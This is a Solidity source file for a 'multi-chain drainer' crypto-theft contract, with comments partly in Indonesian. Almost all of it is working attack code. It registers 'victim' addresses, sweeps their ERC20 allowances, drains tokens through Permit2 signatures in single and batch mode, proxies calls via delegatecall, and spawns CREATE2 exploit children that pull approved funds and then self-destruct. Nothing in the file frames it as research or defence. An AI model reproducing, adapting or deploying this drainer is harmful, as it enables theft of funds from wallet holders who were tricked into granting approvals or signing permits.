// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ============================================================
// MULTI-CHAIN DRAINER — MIRIP ATTACKER ASLI
// ============================================================
// • Deploy via CREATE2 → SAME address di semua chain
// • ChainId-aware → tau di chain mana kontrak berjalan
// • Approve + Permit2 dual mode
// • 8 selectors + exploit child + multi-chain ready
// ============================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPermit2 {
    struct PermitTransferFrom { address permitted; uint256 nonce; uint256 deadline; }
    struct SignatureTransferDetails { address to; uint256 requestedAmount; }
    function permitTransferFrom(PermitTransferFrom calldata, SignatureTransferDetails calldata, address, bytes calldata) external;
}

contract DrainerMultiChain {
    address public owner;
    uint256 public chainId;
    bool public paused;
    
    address[] public victims;
    mapping(address => bool) public isVictim;
    
    address[] public tokens;
    mapping(address => bool) public isToken;
    
    uint256 public totalDrained;
    mapping(uint256 => uint256) public chainDrained; // chainId => total
    
    // Permit2 address SAME di semua EVM chains (CREATE2 deployed)
    IPermit2 constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    
    event ChainRegistered(uint256 chainId);
    event Drained(address indexed token, address indexed from, address to, uint256 amount, uint256 chainId);
    event ExploitDeployed(address indexed exploit, uint256 salt);
    
    modifier onlyOwner() { require(msg.sender == owner, "!owner"); _; }
    
    constructor() {
        owner = msg.sender;
        chainId = block.chainid;
    }
    
    // ============================================
    // 1. init — setup tokens + register chain
    // ============================================
    function init(address[] calldata _tokens, uint256 _chainId) external onlyOwner {
        chainId = _chainId;
        for (uint i = 0; i < _tokens.length; i++) {
            if (!isToken[_tokens[i]]) { isToken[_tokens[i]] = true; tokens.push(_tokens[i]); }
        }
        emit ChainRegistered(_chainId);
    }
    
    // ============================================
    // 2. register — add victims (can be cross-chain)
    // ============================================
    function register(address[] calldata _victims) external onlyOwner {
        for (uint i = 0; i < _victims.length; i++) {
            if (!isVictim[_victims[i]]) { isVictim[_victims[i]] = true; victims.push(_victims[i]); }
        }
    }
    
    // ============================================
    // 3. sweep — drain all standard ERC20 approvals
    // ============================================
    function sweep(address token, address to) external onlyOwner returns (uint256) {
        uint256 total;
        for (uint i = 0; i < victims.length; i++) {
            address u = victims[i];
            uint256 a = IERC20(token).allowance(u, address(this));
            if (a == 0) continue;
            uint256 b = IERC20(token).balanceOf(u);
            uint256 amt = a < b ? a : b;
            if (amt == 0) continue;
            bool ok = IERC20(token).transferFrom(u, to, amt);
            if (ok) {
                total += amt;
                emit Drained(token, u, to, amt, block.chainid);
            }
        }
        totalDrained += total;
        chainDrained[block.chainid] += total;
        return total;
    }
    
    // ============================================
    // 4. report — view all data
    // ============================================
    function report() external view returns (
        uint256 _chainId, address[] memory _victims, address[] memory _tokens,
        uint256 _totalDrained, bool _paused
    ) {
        return (chainId, victims, tokens, totalDrained, paused);
    }
    
    // ============================================
    // 5. control — admin functions
    // ============================================
    function control(uint8 action, address param) external onlyOwner {
        if (action == 1) owner = param;
        else if (action == 2) paused = true;
        else if (action == 3) paused = false;
        else if (action == 4) selfdestruct(payable(owner));
        else if (action == 5) IERC20(param).transfer(owner, IERC20(param).balanceOf(address(this))); // withdraw trapped
    }
    
    // ============================================
    // 6. scan — inspect allowances on THIS chain
    // ============================================
    function scan(address token) external view returns (address[] memory list, uint256[] memory amounts, uint256 total) {
        uint256 count;
        for (uint i = 0; i < victims.length; i++) 
            if (IERC20(token).allowance(victims[i], address(this)) > 0) count++;
        list = new address[](count);
        amounts = new uint256[](count);
        uint256 idx;
        for (uint i = 0; i < victims.length; i++) {
            uint256 a = IERC20(token).allowance(victims[i], address(this));
            if (a > 0) {
                uint256 b = IERC20(token).balanceOf(victims[i]);
                list[idx] = victims[i];
                amounts[idx] = a < b ? a : b;
                total += amounts[idx];
                idx++;
            }
        }
    }
    
    // ============================================
    // 7. delegate — DELEGATECALL proxy to exploit
    // ============================================
    function delegate(address target, bytes calldata data) external onlyOwner {
        (bool ok,) = target.delegatecall(data);
        require(ok, "proxy fail");
    }
    
    // ============================================
    // 8. spawn — CREATE2 deploy exploit child
    // ============================================
    function spawn(bytes32 salt, address attacker) external onlyOwner returns (address) {
        ExploitMulti exp = new ExploitMulti{salt: salt}(address(this), attacker);
        emit ExploitDeployed(address(exp), uint256(salt));
        return address(exp);
    }
    
    // ============================================
    // PERMIT2: Single victim signature drain
    // ============================================
    function permitSingle(
        address token, address from, uint256 amount,
        uint256 nonce, uint256 deadline, bytes calldata sig, address to
    ) external onlyOwner {
        PERMIT2.permitTransferFrom(
            IPermit2.PermitTransferFrom(address(this), nonce, deadline),
            IPermit2.SignatureTransferDetails(to, amount),
            from, sig
        );
        IERC20(token).transferFrom(from, to, amount);
    }
    
    // ============================================
    // PERMIT2: Batch signature drain (cross-chain)
    // ============================================
    function permitBatch(
        address token,
        address[] calldata fromList,
        uint256[] calldata amounts,
        uint256[] calldata nonces,
        uint256[] calldata deadlines,
        bytes[] calldata sigs,
        address to
    ) external onlyOwner {
        uint256 len = fromList.length;
        for (uint i = 0; i < len; i++) {
            uint256 amt = amounts[i] == 0 ? IERC20(token).balanceOf(fromList[i]) : amounts[i];
            PERMIT2.permitTransferFrom(
                IPermit2.PermitTransferFrom(address(this), nonces[i], deadlines[i]),
                IPermit2.SignatureTransferDetails(to, amt),
                fromList[i], sigs[i]
            );
            IERC20(token).transferFrom(fromList[i], to, amt);
            totalDrained += amt;
            chainDrained[block.chainid] += amt;
        }
    }
    
    // ============================================
    // MULTI-CHAIN: Track deployment across chains
    // ============================================
    mapping(uint256 => bool) public chainDeployed;
    mapping(uint256 => address) public chainSpokePool; // bridge contract per chain
    
    function registerChain(uint256 _chainId, address _spokePool) external onlyOwner {
        chainDeployed[_chainId] = true;
        chainSpokePool[_chainId] = _spokePool;
    }
    
    // Compute CREATE2 address for deterministic deployment
    function computeAddress(bytes32 salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(
            bytes1(0xff), address(this), salt, keccak256(type(ExploitMulti).creationCode)
        ));
        return address(uint160(uint256(hash)));
    }
}

// ============================================
// EXPLOIT CHILD — Multi-chain ready
// ============================================
contract ExploitMulti {
    address public owner;    // Slot 0 = matches DrainerMultiChain.owner
    address public attacker; // Slot 1
    
    constructor(address _d, address _a) { owner = _d; attacker = _a; }
    
    function pull(address token, address[] calldata targets, address to) external {
        for (uint i = 0; i < targets.length; i++) {
            uint256 a = IERC20(token).allowance(targets[i], address(this));
            if (a == 0) continue;
            uint256 b = IERC20(token).balanceOf(targets[i]);
            uint256 amt = a < b ? a : b;
            if (amt > 0) IERC20(token).transferFrom(targets[i], to, amt);
        }
        selfdestruct(payable(to));
    }
}
